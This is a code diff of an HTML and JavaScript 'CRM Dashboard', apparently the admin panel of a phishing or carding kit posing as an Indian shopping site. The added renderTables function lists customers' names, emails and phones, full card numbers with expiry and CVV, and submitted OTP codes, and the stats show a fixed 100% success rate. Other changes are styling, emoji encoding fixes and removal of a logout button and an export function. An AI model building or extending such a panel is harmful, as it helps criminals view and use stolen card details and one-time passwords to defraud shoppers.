@@ -27,75 +27,6 @@
       font-weight: 700;
       color: #212121;
     }
-    .crm-controls {
-      display: flex;
-      align-items: center;
-      gap: 15px;
-    }
-    .session-info {
-      font-size: 12px;
-      color: #878787;
-      padding: 4px 8px;
-      border-radius: 4px;
-      background: #f8f9fa;
-    }
-    .sync-status {
-      font-size: 12px;
-      color: #878787;
-      padding: 4px 8px;
-      border-radius: 4px;
-      background: #f8f9fa;
-    }
-    .sync-status.synced {
-      color: #388e3c;
-      background: #e8f5e8;
-    }
-    .sync-status.not-synced {
-      color: #f57c00;
-      background: #fff3e0;
-    }
-    .sync-btn {
-      background: #2874f0;
-      color: #fff;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: 500;
-      font-size: 12px;
-    }
-    .sync-btn:hover {
-      background: #1a8cff;
-    }
-    .sync-btn:disabled {
-      background: #ccc;
-      cursor: not-allowed;
-    }
-    .export-btn {
-      background: #2874f0;
-      color: #fff;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: 500;
-    }
-    .export-btn:hover {
-      background: #1a8cff;
-    }
-    .logout-btn {
-      background: #dc3545;
-      color: #fff;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: 500;
-      font-size: 12px;
-    }
-    .logout-btn:hover {
-      background: #c82333;
-    }
     .stats-container {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -137,6 +68,18 @@
       font-weight: 600;
       color: #212121;
     }
+    .export-btn {
+      background: #2874f0;
+      color: #fff;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 500;
+    }
+    .export-btn:hover {
+      background: #1a8cff;
+    }
     .data-table {
       width: 100%;
       border-collapse: collapse;
@@ -167,6 +110,30 @@
       background: #d4edda;
       color: #155724;
     }
+    .status-pending {
+      background: #fff3cd;
+      color: #856404;
+    }
+    .search-container {
+      margin-bottom: 20px;
+      display: flex;
+      gap: 10px;
+    }
+    .search-input {
+      flex: 1;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    .search-btn {
+      background: #2874f0;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
     .tabs {
       display: flex;
       gap: 10px;
@@ -192,6 +159,63 @@
     .tab-content.active {
       display: block;
     }
+    .crm-controls {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .sync-status {
+      font-size: 12px;
+      color: #878787;
+      padding: 4px 8px;
+      border-radius: 4px;
+      background: #f8f9fa;
+    }
+    .sync-status.synced {
+      color: #388e3c;
+      background: #e8f5e8;
+    }
+    .sync-status.not-synced {
+      color: #f57c00;
+      background: #fff3e0;
+    }
+    .sync-btn {
+      background: #2874f0;
+      color: #fff;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 500;
+      font-size: 12px;
+    }
+    .sync-btn:hover {
+      background: #1a8cff;
+    }
+    .sync-btn:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+    .session-info {
+      font-size: 12px;
+      color: #878787;
+      padding: 4px 8px;
+      border-radius: 4px;
+      background: #f8f9fa;
+    }
+    .logout-btn {
+      background: #dc3545;
+      color: #fff;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 500;
+      font-size: 12px;
+    }
+    .logout-btn:hover {
+      background: #c82333;
+    }
   </style>
 </head>
 <body>
@@ -200,13 +224,12 @@
 <div class="crm-container">
   <!-- Header -->
   <div class="crm-header">
-    <div class="crm-title">ð CRM Dashboard</div>
+    <div class="crm-title">📊 CRM Dashboard</div>
     <div class="crm-controls">
       <div class="session-info" id="session-info">Loading...</div>
       <div class="sync-status" id="sync-status">Checking sync...</div>
-      <button class="sync-btn" id="sync-btn" onclick="manualSync()">ð¤ Sync from Cloud</button>
-      <button class="export-btn" onclick="exportData()">ð¥ Export Data</button>
-      <button class="logout-btn" id="logout-btn">ð Logout</button>
+      <button class="sync-btn" id="sync-btn" onclick="manualSync()">🔄 Sync from Cloud</button>
+      <button class="export-btn" onclick="exportData()">📥 Export Data</button>
     </div>
   </div>
 
@@ -241,7 +264,7 @@
   <div id="orders-tab" class="tab-content active">
     <div class="table-container">
       <div class="table-header">
-        <div class="table-title">ð Order History</div>
+        <div class="table-title">📋 Order History</div>
       </div>
       <table class="data-table">
         <thead>
@@ -265,7 +288,7 @@
   <div id="cards-tab" class="tab-content">
     <div class="table-container">
       <div class="table-header">
-        <div class="table-title">ð Card Details</div>
+        <div class="table-title">💳 Card Details</div>
       </div>
       <table class="data-table">
         <thead>
@@ -289,7 +312,7 @@
   <div id="otp-tab" class="tab-content">
     <div class="table-container">
       <div class="table-header">
-        <div class="table-title">ð OTP Verifications</div>
+        <div class="table-title">🔐 OTP Verifications</div>
       </div>
       <table class="data-table">
         <thead>
@@ -406,6 +429,58 @@
     }
   }
 
+  // Update statistics
+  function updateStats() {
+    document.getElementById('total-orders').textContent = crmData.orders.length;
+    document.getElementById('total-cards').textContent = crmData.cards.length;
+    document.getElementById('total-otp').textContent = crmData.otp.length;
+    
+    const total = crmData.otp.length;
+    const successRate = total > 0 ? '100' : '0';
+    document.getElementById('success-rate').textContent = successRate + '%';
+  }
+
+  // Render tables
+  function renderTables() {
+    // Render orders
+    const ordersTbody = document.getElementById('orders-tbody');
+    ordersTbody.innerHTML = crmData.orders.map(order => `
+      <tr>
+        <td>${order.timestamp}</td>
+        <td>${order.fullName}</td>
+        <td>${order.email}</td>
+        <td>${order.phone}</td>
+        <td>₹${order.orderTotal}</td>
+        <td><span class="status-badge status-success">${order.status}</span></td>
+      </tr>
+    `).join('');
+
+    // Render card details
+    const cardsTbody = document.getElementById('cards-tbody');
+    cardsTbody.innerHTML = crmData.cards.map(card => `
+      <tr>
+        <td>${new Date(card.timestamp).toLocaleString()}</td>
+        <td>${card.cardName}</td>
+        <td>${card.cardNumber}</td>
+        <td>${card.expiry}</td>
+        <td>${card.cvv}</td>
+        <td><span class="status-badge status-success">${card.status}</span></td>
+      </tr>
+    `).join('');
+
+    // Render OTP data
+    const otpTbody = document.getElementById('otp-tbody');
+    otpTbody.innerHTML = crmData.otp.map(otp => `
+      <tr>
+        <td>${new Date(otp.timestamp).toLocaleString()}</td>
+        <td>${otp.submittedOTP}</td>
+        <td>${otp.email}</td>
+        <td>${otp.phone}</td>
+        <td><span class="status-badge status-success">${otp.status}</span></td>
+      </tr>
+    `).join('');
+  }
+
   // Tab switching
   function showTab(tabName) {
     // Hide all tabs
@@ -419,11 +494,6 @@
     // Show selected tab
     document.getElementById(tabName + '-tab').classList.add('active');
     event.target.classList.add('active');
-  }
-
-  // Export data
-  function exportData() {
-    window.cloudCRMStorage.exportData();
   }
 
   // Initialize and auto-refresh
